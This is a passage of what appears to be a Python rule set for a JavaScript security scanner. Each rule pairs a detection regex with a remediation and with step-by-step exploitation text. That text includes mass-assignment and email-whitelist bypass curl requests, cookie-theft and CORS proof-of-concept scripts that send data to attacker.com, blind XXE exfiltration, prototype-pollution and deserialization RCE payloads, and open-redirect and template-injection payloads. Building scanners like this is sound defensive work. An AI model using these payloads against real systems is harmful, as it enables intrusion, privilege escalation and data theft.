if (user.role === 'admin' || user.isVerified || tempAccess) { /* access */ }

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Identify what other conditions exist in the OR chain
2. Find a way to make any of them true:
   - Set debug flags via URL params
   - Manipulate feature flags if client-controlled
   - Exploit loose boolean coercion (0, "", null might be issues)

TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Look for ways to satisfy any condition in the OR chain rather than the role check.""",
        remediation="Use AND logic for critical checks. Separate role checks from debug/feature flags. Never OR security checks with debug conditions."
    ),
    SecurityRule(
        id="AUTH-010",
        name="Authorization Based on Untrusted User Field",
        pattern=r"(req\.user|user|currentUser|session\.user)\s*\.\s*(isAdmin|admin|role|isSuper|isModerator|permissions|accessLevel)\b",
        severity=Severity.MEDIUM,
        category="Privilege Escalation",
        cwe_id="CWE-639",
        description="Authorization decision based on user object field - ensure this cannot be manipulated via mass assignment or JWT tampering.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PRIVILEGE ESCALATION VIA USER OBJECT MANIPULATION                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
Authorization checks user.isAdmin, user.role, etc. If these fields can be
set during registration, profile update, or JWT claims - privilege escalation possible.

ATTACK VECTORS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. MASS ASSIGNMENT DURING REGISTRATION:

curl -X POST https://target.com/api/register \\
  -H 'Content-Type: application/json' \\
  -d '{
    "email": "attacker@test.com",
    "password": "password123",
    "isAdmin": true,
    "role": "admin",
    "permissions": ["admin", "superuser"]
  }'

2. MASS ASSIGNMENT DURING PROFILE UPDATE:

curl -X PUT https://target.com/api/profile \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -H 'Content-Type: application/json' \\
  -d '{
    "name": "Attacker",
    "isAdmin": true,
    "role": "administrator"
  }'

3. JWT CLAIM INJECTION (if using JWT with claims from user input):

# Forge JWT with elevated claims
{
  "sub": "user123",
  "email": "attacker@test.com",
  "isAdmin": true,
  "role": "admin"
}

4. GRAPHQL MUTATION:

mutation {
  updateUser(input: {
    id: "my-user-id"
    isAdmin: true
    role: "admin"
  }) {
    id
    isAdmin
    role
  }
}

VERIFICATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# After attempting mass assignment, check your user object:
curl https://target.com/api/me -H 'Authorization: Bearer YOUR_TOKEN'

# Look for isAdmin: true or role: "admin" in response""",
        remediation="Whitelist allowed fields in registration/update. Never trust role/admin fields from user input. Fetch fresh user permissions from database for each protected action."
    ),
    SecurityRule(
        id="AUTH-011",
        name="Email/Domain Whitelist with Partial Matching",
        pattern=r"(allowedList|whitelist|allowedEmails|allowedDomains|adminEmails|trustedDomains)\s*\.\s*(some|find|filter|includes|indexOf)\s*\([^)]*\.(includes|indexOf|match|startsWith|endsWith|toLowerCase\.includes)",
        severity=Severity.CRITICAL,
        category="Privilege Escalation",
        cwe_id="CWE-285",
        description="Email/domain whitelist uses substring matching, allowing bypass with crafted values that contain the allowed string.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  CRITICAL: WHITELIST BYPASS VIA SUBSTRING MATCHING                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
The code checks if user email/domain CONTAINS an allowed value, not exact match.
allowedList.some(email => userEmail.includes(email)) is BYPASSABLE!

EXAMPLE VULNERABLE CODE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const allowedList = ['admin@corp.com', 'ceo@corp.com'];
const isAdmin = allowedList.some(email => userEmail.toLowerCase().includes(email));
// BUG: 'admin@corp.com.attacker.com'.includes('admin@corp.com') === TRUE!

EXPLOITATION - EMAIL BYPASS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If whitelisted email is: admin@company.com

BYPASS EMAILS (register/use these):
• admin@company.com.attacker.com     ← You control this domain!
• admin@company.com@attacker.com     ← Double @ trick
• admin@company.com.evil.com         ← Subdomain of your domain
• fake+admin@company.com@evil.com    ← Plus addressing + your domain
• admin@company.comattacker.com      ← No dot separator

STEP-BY-STEP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Register domain: company.com.yourdomain.com (or any domain containing target)

2. Set up email receiving for that domain (mailgun, improvmx, etc.)

3. Register account on target:
   curl -X POST https://target.com/api/register \\
     -d '{"email": "admin@company.com.yourdomain.com", "password": "test"}'

4. Receive verification email at YOUR domain

5. Verify email and login

6. Access admin features (your email "contains" the allowed email!)

DOMAIN WHITELIST BYPASS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If allowed domain is: @company.com

BYPASS DOMAINS:
• @company.com.attacker.com
• @notcompany.com (contains 'company.com')
• @my-company.com (contains 'company.com')

TESTING PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Test if partial matching works
curl -X POST https://target.com/api/register \\
  -H 'Content-Type: application/json' \\
  -d '{
    "email": "anything@admin-domain.com.your-domain.com",
    "password": "testpassword123"
  }'

# Check admin access after email verification
curl https://target.com/api/admin/users \\
  -H 'Authorization: Bearer NEW_USER_TOKEN'""",
        remediation="""SECURE ALTERNATIVES:
• Exact match: allowedList.includes(userEmail.toLowerCase())
• Parse email domain: email.split('@')[1] === allowedDomain
• Use regex with anchors: /^admin@company\\.com$/i.test(email)
• Proper email parsing library"""
    ),
    SecurityRule(
        id="AUTH-012",
        name="Combined Auth Backdoor Pattern",
        pattern=r"(isAdmin|checkAdmin|isAllowed|hasAccess|isAuthorized)\s*[=:]\s*[^;{]*\b(urlParams|searchParams|localStorage|sessionStorage|window\.).*\b(admin|debug|test|bypass)",
        severity=Severity.CRITICAL,
        category="Privilege Escalation",
        cwe_id="CWE-284",
        description="Authorization combines multiple insecure patterns - URL parameters with admin checks.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  COMBINED AUTHENTICATION BACKDOOR                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝

This pattern combines multiple vulnerabilities:
1. URL parameter checking for authorization
2. Client-side storage for privilege determination
3. Debug/test mode flags

COMPLETE EXPLOITATION CHECKLIST:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

□ Try adding ?debug=1 to URL
□ Try adding ?admin=true to URL
□ Try adding ?test=1 to URL
□ Set localStorage.isAdmin = 'true'
□ Set localStorage.role = 'admin'
□ Set sessionStorage.isAdmin = 'true'
□ Set document.cookie = 'isAdmin=true'
□ Combine: URL param + storage manipulation
□ Check if admin UI elements appear
□ Test admin API endpoints""",
        remediation="Remove all client-side authorization. Implement proper server-side RBAC. Remove debug parameters from production."
    ),
    SecurityRule(
        id="AUTH-013",
        name="URL Parameter Gate for Admin Functions",
        pattern=r"(urlParams|searchParams|URLSearchParams)\s*\.\s*has\s*\(\s*['\"][^'\"]+['\"]\s*\)",
        severity=Severity.HIGH,
        category="Privilege Escalation",
        cwe_id="CWE-284",
        description="Authorization logic uses URL parameter presence check - likely a backdoor that can be triggered by any user.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  BACKDOOR URL PARAMETER GATE DETECTED                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
The code checks if a specific URL parameter EXISTS using .has()
This means ANY VALUE (even empty) will enable the hidden functionality!

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. IDENTIFY THE PARAMETER NAME from the code (e.g., 'kingcharles', 'debug', etc.)

2. ADD IT TO ANY URL ON THE SITE:
   https://target.com/?paramname
   https://target.com/?paramname=
   https://target.com/?paramname=anything
   https://target.com/dashboard?paramname=1
   https://target.com/api/endpoint?paramname

3. TEST ALL VARIATIONS:
   • ?param             (just the name)
   • ?param=            (empty value)
   • ?param=1           (truthy value)
   • ?param=true        (boolean-like)
   • ?other=x&param&y=z (in the middle)

REAL-WORLD EXAMPLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If code has: urlParams.has('kingcharles')

EXPLOITATION:
1. Login as regular user
2. Go to any page: https://target.com/dashboard
3. Add the parameter: https://target.com/dashboard?kingcharles
4. Reload the page
5. Check if admin features are now enabled!

AUTOMATED TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Bash script to test common backdoor params
for param in debug test admin dev staging internal bypass override god master; do
  echo "Testing ?$param"
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/admin?$param" -H "Cookie: session=YOUR_SESSION"
done

CURL WITH DISCOVERED PARAM:
curl -v 'https://target.com/dashboard?kingcharles' \\
  -H 'Cookie: session=YOUR_SESSION_COOKIE'

WHAT TO LOOK FOR AFTER ENABLING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• New admin menu items appearing
• Access to previously forbidden pages
• Additional API responses with sensitive data
• Debug information in responses
• Different UI elements or permissions""",
        remediation="Remove ALL URL parameter checks from authorization logic. Use proper server-side RBAC. If feature flags are needed, use environment variables, not URL params."
    ),
    SecurityRule(
        id="AUTH-014",
        name="Admin Email Whitelist with Substring Check",
        pattern=r"(allowedList|adminEmails|siteAdminEmails|allowedEmails)\s*\.\s*some\s*\([^)]*\.\s*(includes|indexOf|match)",
        severity=Severity.CRITICAL,
        category="Privilege Escalation",
        cwe_id="CWE-285",
        description="Admin email whitelist uses .some() with .includes() - allows privilege escalation by registering emails that CONTAIN allowed emails as substrings.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ADMIN EMAIL WHITELIST BYPASS - SUBSTRING ATTACK                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

CRITICAL VULNERABILITY:
The code checks: adminEmails.some(email => userEmail.includes(email))
This is BACKWARDS! It checks if YOUR email CONTAINS the admin email!

'admin@corp.com.evil.com'.includes('admin@corp.com') === TRUE!

STEP-BY-STEP PRIVILEGE ESCALATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. DISCOVER ADMIN EMAILS:
   • Check the config file for 'siteAdminEmails' or 'allowedList'
   • Look for admin emails in documentation, about page, etc.
   • Example: ['admin@company.com', 'ceo@company.com']

2. REGISTER A DOMAIN YOU CONTROL:
   • Register: company.com.yourdomain.com
   • Or: anything-admin@company.com.yourdomain.com
   
3. SET UP EMAIL RECEIVING:
   • Use a service like ImprovMX, Mailgun, or your own mail server
   • Configure to receive emails at your crafted domain

4. REGISTER ON TARGET:
   curl -X POST https://target.com/api/register \\
     -H 'Content-Type: application/json' \\
     -d '{
       "email": "admin@company.com.yourdomain.com",
       "password": "yourpassword",
       "name": "Your Name"
     }'

5. VERIFY YOUR EMAIL:
   • Check your mailbox for the verification email
   • Click the verification link

6. TRIGGER THE ADMIN CHECK:
   • If there's a backdoor param: https://target.com/dashboard?kingcharles
   • Or simply login and check admin features
   • Your email CONTAINS 'admin@company.com' so you pass the check!

7. ACCESS ADMIN FEATURES:
   curl https://target.com/api/admin/users \\
     -H 'Authorization: Bearer YOUR_TOKEN'

BYPASS EMAIL FORMATS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If admin email is: admin@corp.com

✓ admin@corp.com.evil.com       (YOU receive verification)
✓ admin@corp.com@evil.com       (double @ trick)
✓ anything-admin@corp.com@x.com (prefix + suffix)
✓ admin@corp.com.x.yourdomain.com (subdomain)

COMBINED WITH BACKDOOR PARAM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If code also checks for a URL param like 'kingcharles':

1. Register with: admin@company.com.yourdomain.com
2. Verify email
3. Login
4. Visit: https://target.com/admin?kingcharles
5. YOU NOW HAVE ADMIN ACCESS!""",
        remediation="""FIX THE CODE:
WRONG: allowedList.some(email => userEmail.includes(email))
RIGHT: allowedList.some(email => userEmail.toLowerCase() === email.toLowerCase())

Or use proper email validation:
const domain = email.split('@')[1];
const allowedDomains = ['company.com'];
return allowedDomains.includes(domain);"""
    ),

    # -------------------------------------------------------------------------
    # INFORMATION DISCLOSURE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="INFO-001",
        name="AWS Access Key Exposed",
        pattern=r"AKIA[0-9A-Z]{16}",
        severity=Severity.CRITICAL,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="AWS Access Key ID found in source code.",
        exploitation="""
EXPLOITATION:
1. Look for corresponding secret key (usually nearby)
2. Configure AWS CLI: aws configure
3. Test access: aws sts get-caller-identity

ENUMERATION:
- aws s3 ls (list buckets)
- aws ec2 describe-instances
- aws iam list-users
- aws lambda list-functions

PRIVILEGE ESCALATION:
- Check IAM permissions with enumerate-iam tool
- Look for iam:PassRole, sts:AssumeRole permissions

PERSISTENCE:
- Create new IAM user
- Add SSH key to EC2
- Create Lambda backdoor""",
        remediation="Rotate the exposed key immediately. Use IAM roles instead of access keys when possible."
    ),
    SecurityRule(
        id="INFO-002",
        name="Private Key Exposed",
        pattern=r"-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----",
        severity=Severity.CRITICAL,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="Private key found in source code.",
        exploitation="""
EXPLOITATION:
1. Extract the complete private key (including BEGIN/END markers)
2. Identify the service using this key

FOR SSH KEYS:
- Try connecting to discovered hosts: ssh -i key.pem user@host
- Check known_hosts, authorized_keys for hints

FOR SSL/TLS KEYS:
- Decrypt HTTPS traffic if you have packet capture
- Impersonate the server

FOR JWT RS256:
- Sign arbitrary JWT tokens""",
        remediation="Rotate the key immediately. Store keys in secure key management systems."
    ),
    SecurityRule(
        id="INFO-003",
        name="Generic API Key Pattern",
        pattern=r"(api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*['\"][a-zA-Z0-9_\-]{20,}['\"]",
        severity=Severity.MEDIUM,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="Potential API key found in source code.",
        exploitation="""
EXPLOITATION:
1. Identify the service (look for nearby URLs, imports)
2. Test the key against the service's API
3. Check rate limits and permissions

COMMON SERVICES:
- Stripe: sk_live_xxx (full payment access)
- SendGrid: SG.xxx (send emails)
- Twilio: Use with account SID
- Google: Varies by API""",
        remediation="Use environment variables for API keys. Restrict key permissions to minimum required."
    ),
    SecurityRule(
        id="INFO-004",
        name="Database Connection String",
        pattern=r"(mongodb|postgres|mysql|redis|amqp)://[^\s'\"`]+:[^\s'\"`]+@[^\s'\"`]+",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="Database connection string with credentials found.",
        exploitation="""
EXPLOITATION:
1. Parse the connection string for host, credentials
2. Attempt to connect to the database

TOOLS:
- MongoDB: mongosh "mongodb://user:pass@host/db"
- PostgreSQL: psql "postgres://user:pass@host/db"
- MySQL: mysql -h host -u user -ppass db
- Redis: redis-cli -h host -a pass

ENUMERATION:
- List databases, tables, users
- Check for sensitive data
- Look for privilege escalation paths""",
        remediation="Use environment variables. Implement network restrictions (VPC, firewall)."
    ),
    SecurityRule(
        id="INFO-005",
        name="GitHub/GitLab Token Exposed",
        pattern=r"(gh[pousr]_[A-Za-z0-9_]{36}|glpat-[A-Za-z0-9\-]{20,})",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="GitHub or GitLab personal access token found.",
        exploitation="""
EXPLOITATION:
For GitHub tokens (ghp_, gho_, ghu_, ghs_, ghr_):
1. Check token scope: curl -H "Authorization: token TOKEN" https://api.github.com
2. List repos: curl -H "Authorization: token TOKEN" https://api.github.com/user/repos
3. Check org access, secrets, actions

For GitLab (glpat-):
1. curl -H "PRIVATE-TOKEN: TOKEN" https://gitlab.com/api/v4/user
2. Access private repos, CI variables""",
        remediation="Revoke token immediately. Use fine-grained tokens with minimum permissions."
    ),
    SecurityRule(
        id="INFO-006",
        name="Slack Token Exposed",
        pattern=r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-200",
        description="Slack API token found in source code.",
        exploitation="""
EXPLOITATION:
1. Identify token type (xoxb=bot, xoxp=user, etc.)
2. Check permissions: curl -X POST -d "token=TOKEN" https://slack.com/api/auth.test
3. List channels: curl -X POST -d "token=TOKEN" https://slack.com/api/conversations.list
4. Read messages, files, user info
5. Post messages (social engineering vector)""",
        remediation="Revoke token in Slack admin. Use bot tokens with limited scopes."
    ),

    # -------------------------------------------------------------------------
    # INSECURE CONFIGURATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="CONFIG-001",
        name="CORS Allow All Origins",
        pattern=r"(Access-Control-Allow-Origin|allowedOrigins?|cors\s*\()\s*[=:(\[]\s*['\"]?\*['\"]?",
        severity=Severity.MEDIUM,
        category="Misconfiguration",
        cwe_id="CWE-942",
        description="CORS configured to allow all origins, enabling cross-site data theft.",
        exploitation="""
EXPLOITATION:
1. Create malicious page that makes requests to vulnerable API
2. User visits your page, their browser sends requests with their cookies
3. Your page can read the responses

POC HTML:
<script>
fetch('https://vulnerable-api.com/user/data', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)));
</script>

HOST on attacker domain and send link to victim.""",
        remediation="Whitelist specific trusted origins. Never use * in production with credentials."
    ),
    SecurityRule(
        id="CONFIG-002",
        name="Debug Mode Enabled",
        pattern=r"(debug|DEBUG)\s*[=:]\s*(true|1|['\"]true['\"]|['\"]1['\"])|NODE_ENV\s*[!=]==?\s*['\"]development['\"]",
        severity=Severity.LOW,
        category="Misconfiguration",
        cwe_id="CWE-489",
        description="Debug mode appears to be enabled, potentially exposing sensitive information.",
        exploitation="""
EXPLOITATION:
Debug mode often enables:
1. Detailed error messages with stack traces
2. Debug endpoints (/__debug__, /debug, /trace)
3. Verbose logging to response
4. Development tools

LOOK FOR:
- Full file paths in errors
- Database query details
- Environment variables leaked
- Source code snippets

TEST:
- Cause errors by sending malformed input
- Check for debug headers in responses""",
        remediation="Disable debug mode in production. Use NODE_ENV=production."
    ),
    SecurityRule(
        id="CONFIG-003",
        name="Insecure Cookie Configuration",
        pattern=r"(cookie|session)\s*[({][^}]*(?:httpOnly|secure|sameSite)\s*:\s*false",
        severity=Severity.MEDIUM,
        category="Misconfiguration",
        cwe_id="CWE-614",
        description="Cookie security flags are disabled.",
        exploitation="""
EXPLOITATION:
If httpOnly: false:
- XSS can steal session cookies via document.cookie

If secure: false:
- Cookies sent over HTTP, vulnerable to MITM
- Use network sniffing on same network

If sameSite: 'none' without secure:
- CSRF attacks possible
- Cross-site requests include cookies

POC (XSS + cookie theft):
<script>fetch('https://attacker.com/?c='+document.cookie)</script>""",
        remediation="Enable httpOnly, secure, and sameSite='strict' for session cookies."
    ),
    SecurityRule(
        id="CONFIG-004",
        name="TLS/SSL Verification Disabled",
        pattern=r"(rejectUnauthorized|strictSSL|verify)\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0['\"]?",
        severity=Severity.HIGH,
        category="Misconfiguration",
        cwe_id="CWE-295",
        description="TLS certificate verification is disabled, allowing MITM attacks.",
        exploitation="""
EXPLOITATION:
1. Position yourself as MITM (same network, DNS poisoning, etc.)
2. Intercept HTTPS traffic with self-signed cert
3. Application will accept the fraudulent certificate
4. Read/modify encrypted traffic

TOOLS:
- mitmproxy
- Burp Suite
- SSLsplit""",
        remediation="Never disable certificate verification. Install proper CA certificates."
    ),

    # -------------------------------------------------------------------------
    # INSECURE RANDOMNESS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="RAND-001",
        name="Weak Random Number Generation",
        pattern=r"Math\.random\s*\(\s*\)",
        severity=Severity.MEDIUM,
        category="Insecure Randomness",
        cwe_id="CWE-330",
        description="Math.random() is not cryptographically secure.",
        exploitation="""
EXPLOITATION:
Math.random() uses predictable PRNG algorithms.

IF USED FOR:
- Session tokens: Predict next token after observing several
- Password reset tokens: Same as above
- CSRF tokens: Generate valid tokens
- Verification codes: Predict OTPs

TECHNIQUES:
1. Collect multiple random outputs
2. Use z3 SAT solver to recover PRNG state
3. Predict future or past values

TOOLS:
- JavaScript PRNG cracker scripts
- z3 Python bindings for state recovery""",
        remediation="Use crypto.randomBytes() in Node.js or window.crypto.getRandomValues() in browsers."
    ),

    # -------------------------------------------------------------------------
    # PROTOTYPE POLLUTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PROTO-001",
        name="Prototype Pollution via Object Merge",
        pattern=r"(Object\.assign|_\.merge|_\.extend|_\.defaultsDeep|\$\.extend|merge|deepMerge)\s*\([^)]*(\+|\[|req\.|request\.|params\.|body\.)",
        severity=Severity.HIGH,
        category="Prototype Pollution",
        cwe_id="CWE-1321",
        description="Object merge with user input may allow prototype pollution.",
        exploitation="""
EXPLOITATION:
1. Send specially crafted JSON with __proto__ key

PAYLOAD:
{"__proto__": {"isAdmin": true}}
or
{"constructor": {"prototype": {"isAdmin": true}}}

IMPACT:
- Add properties to all objects
- Bypass security checks (if (user.isAdmin))
- RCE via gadget chains (with certain libraries)

RCE GADGETS (if using vulnerable libraries):
- Pug/Jade: {"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require('child_process').execSync('id');//"}}}
- Handlebars: {"__proto__": {"pendingContent": "x]));process.mainModule.require('child_process').execSync('id');//"}}

TEST: Add {"__proto__": {"polluted": true}} then check if ({}).polluted === true""",
        remediation="Validate input structure. Use Object.create(null) for key-value stores. Freeze Object.prototype."
    ),
    SecurityRule(
        id="PROTO-002",
        name="Unsafe Property Access",
        pattern=r"\[[^\]]*(\+|req\.|request\.|params\.|query\.|body\.)[^\]]*\]\s*=",
        severity=Severity.MEDIUM,
        category="Prototype Pollution",
        cwe_id="CWE-1321",
        description="Dynamic property assignment with user input may allow prototype pollution.",
        exploitation="""
EXPLOITATION:
obj[userInput] = value can pollute prototype if userInput is "__proto__"

PAYLOAD:
key=__proto__&value[isAdmin]=true
or
{"key": "__proto__", "value": {"isAdmin": true}}

POC: Set key to "__proto__" and observe if global objects gain new properties""",
        remediation="Block __proto__, constructor, prototype keys. Use Map instead of plain objects."
    ),

    # -------------------------------------------------------------------------
    # OPEN REDIRECT
    # -------------------------------------------------------------------------
    SecurityRule(
        id="REDIRECT-001",
        name="Open Redirect Vulnerability",
        pattern=r"(res\.redirect|response\.redirect|window\.location|location\.href|location\.replace)\s*\([^)]*(\+|`|\$\{|req\.|request\.|params\.|query\.)",
        severity=Severity.MEDIUM,
        category="Open Redirect",
        cwe_id="CWE-601",
        description="Redirect destination controlled by user input allows phishing attacks.",
        exploitation="""
EXPLOITATION:
1. Craft URL with redirect to attacker site
2. Send to victim (looks legitimate due to original domain)
3. Victim lands on phishing page

PAYLOADS:
- //attacker.com (protocol-relative)
- https://attacker.com
- ///attacker.com (triple slash bypass)
- //attacker.com%2F@legitimate.com (URL parsing confusion)
- https://legitimate.com@attacker.com
- ////attacker.com (multiple slashes)
- /\\attacker.com (backslash bypass)
- https:attacker.com (missing slashes)

URL ENCODING BYPASSES:
- %2f%2fattacker.com
- %252f%252fattacker.com

POC: https://vulnerable.com/redirect?url=https://attacker.com""",
        remediation="Validate redirects against whitelist. Use relative paths only. Parse and verify hostname."
    ),

    # -------------------------------------------------------------------------
    # INSECURE DESERIALIZATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="DESER-001",
        name="Insecure Deserialization via serialize-javascript",
        pattern=r"(serialize|deserialize|unserialize|node-serialize)\s*\([^)]*(\+|`|\$\{|req\.|body\.)",
        severity=Severity.CRITICAL,
        category="Insecure Deserialization",
        cwe_id="CWE-502",
        description="Deserialization of untrusted data can lead to RCE.",
        exploitation="""
EXPLOITATION:
node-serialize and similar libraries can execute code during deserialization.

PAYLOAD (node-serialize RCE):
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}

STEPS:
1. Identify where deserialization occurs
2. Craft payload with IIFE (Immediately Invoked Function Expression)
3. Send payload (often base64 encoded in cookies)

GENERATE PAYLOAD:
var serialize = require('node-serialize');
var payload = {"rce": function(){require('child_process').execSync('id')}};
console.log(serialize.serialize(payload));
// Then add () before last } to make it IIFE""",
        remediation="Avoid deserializing user input. Use JSON.parse() for data interchange."
    ),

    # -------------------------------------------------------------------------
    # XML EXTERNAL ENTITY (XXE)
    # -------------------------------------------------------------------------
    SecurityRule(
        id="XXE-001",
        name="XML Parsing with External Entities",
        pattern=r"(xml2js|libxmljs|DOMParser|parseXML)\s*[\.\(]|\.parseString\s*\(|xmldom|fast-xml-parser",
        severity=Severity.MEDIUM,
        category="XML External Entity",
        cwe_id="CWE-611",
        description="XML parsing may be vulnerable to XXE if external entities are enabled.",
        exploitation="""
EXPLOITATION:
If XML parser processes external entities:

FILE READ:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

SSRF:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

BLIND XXE (OOB):
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>

xxe.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;""",
        remediation="Disable external entities. For xml2js, external entities are disabled by default. Verify parser configuration."
    ),

    # -------------------------------------------------------------------------
    # DENIAL OF SERVICE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="DOS-001",
        name="Regular Expression Denial of Service (ReDoS)",
        pattern=r"new\s+RegExp\s*\([^)]*(\+|`|\$\{|req\.|params\.)|\.match\s*\(\s*new\s+RegExp",
        severity=Severity.MEDIUM,
        category="Denial of Service",
        cwe_id="CWE-1333",
        description="User-controlled regex can cause ReDoS via catastrophic backtracking.",
        exploitation="""
EXPLOITATION:
1. Craft regex with exponential backtracking
2. Provide input that triggers worst-case matching

EVIL REGEX PATTERNS:
- (a+)+$
- ([a-zA-Z]+)*$
- (a|aa)+$
- (.*a){x} for large x

ATTACK INPUT:
For (a+)+$ -> "aaaaaaaaaaaaaaaaaaaaaaaaa!" (many a's followed by non-a)

STEPS:
1. If user controls pattern: submit catastrophic regex
2. If user controls input: find existing vulnerable regex and craft input
3. Server hangs processing the regex

POC: Send "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" against (a+)+$ pattern""",
        remediation="Validate regex complexity. Use regex timeout libraries (safe-regex). Avoid user-controlled regex."
    ),

    # -------------------------------------------------------------------------
    # MASS ASSIGNMENT
    # -------------------------------------------------------------------------
    SecurityRule(
        id="MASS-001",
        name="Mass Assignment Vulnerability",
        pattern=r"\.(create|update|findOneAndUpdate|updateOne|findByIdAndUpdate)\s*\([^)]*req\.body|Object\.assign\s*\([^,]+,\s*req\.body",
        severity=Severity.MEDIUM,
        category="Mass Assignment",
        cwe_id="CWE-915",
        description="Passing entire request body to database operations allows setting unintended fields.",
        exploitation="""
EXPLOITATION:
Add unexpected fields to modify protected attributes:

PAYLOADS:
- {"username": "user", "role": "admin"}
- {"email": "new@example.com", "isVerified": true}
- {"amount": 100, "status": "approved"}
- {"name": "test", "password": "newpass"}

STEPS:
1. Identify the model/schema being updated
2. Find protected fields (role, isAdmin, verified, etc.)
3. Add those fields to your request body

POC:
Normal: POST /api/profile {"name": "John"}
Attack: POST /api/profile {"name": "John", "role": "admin"}""",
        remediation="Whitelist allowed fields explicitly. Use DTOs or pick specific fields: User.update({name: req.body.name})"
    ),

    # -------------------------------------------------------------------------
    # SERVER-SIDE TEMPLATE INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="SSTI-001",
        name="Server-Side Template Injection",
        pattern=r"(ejs|pug|jade|handlebars|mustache|nunjucks|twig)\.render\s*\([^)]*(\+|`|\$\{|req\.|body\.)",
        severity=Severity.HIGH,
        category="Template Injection",
        cwe_id="CWE-94",
        description="Template rendering with user input may allow server-side template injection.",
        exploitation="""
EXPLOITATION:
Different template engines have different syntax:

EJS:
- <%= process.mainModule.require('child_process').execSync('id') %>
- <% include('/etc/passwd') %>

PUG/JADE:
